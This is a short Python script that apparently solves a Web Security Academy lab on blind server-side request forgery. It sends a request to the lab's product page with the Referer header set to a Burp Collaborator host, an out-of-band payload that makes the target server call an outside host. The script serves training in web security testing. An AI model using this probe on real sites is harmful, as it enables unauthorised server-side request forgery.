import requests

s = requests.Session()
url = "https://ac4a1f871f57669fc0d81844005b0060.web-security-academy.net/product?productId=1"

s.get(url, headers={'referer': "https://burpcollaborator.net"})
